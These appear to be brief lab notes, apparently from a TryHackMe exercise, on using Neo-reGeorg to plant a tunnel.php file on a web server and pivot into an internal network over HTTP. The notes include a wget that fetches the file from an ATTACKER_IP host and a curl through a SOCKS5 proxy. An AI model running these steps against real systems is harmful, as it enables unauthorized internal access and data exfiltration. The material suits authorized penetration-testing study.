Neo-reGeorg - lets us establish a communication channel to access the internal network devices

HTTP Tunneling for data exfiltration:
  python3 neoreg.py generate -k thm          To create an HTTP tunnel communication channel and pivot into the internal network 
                                             and communicate with local network devices through HTTP protocol, we need to
                                             generate an encrypted tunneling client file and upload it to the webserver machine that connects to WAN.
                                             The command above creates a client with the `thm` key in the `neoreg_servers/` directory
  python3 -m http.server
	wget http://<ATTACKER_IP>:8000/tunnel.php -O tunnel.php
	move .\tunnel.php C:\var\www\data\tunnel.php
                                             Upload the tunnel.php file into the web server directory
  python3 neoreg.py generate -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
                                             Once it's uploaded, we can access it on the following URL: http://MACHINE_IP/uploader/files/tunnel.php.
                                             Use this command to connect to the client and provide the key to decrypt the tunneling client. Once it is
                                             connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local
                                             machine, `127.0.0.1`, on port `1080`.
  curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
                                             If we want to access the internal machine, which has an internal IP address `172.20.0.121` on port
                                             `80`, we can use the `curl` command with `--socks5` argument. We can also use other proxy applications,
                                             such as `ProxyChains`, `FoxyProxy`, etc., to communicate with the internal network.
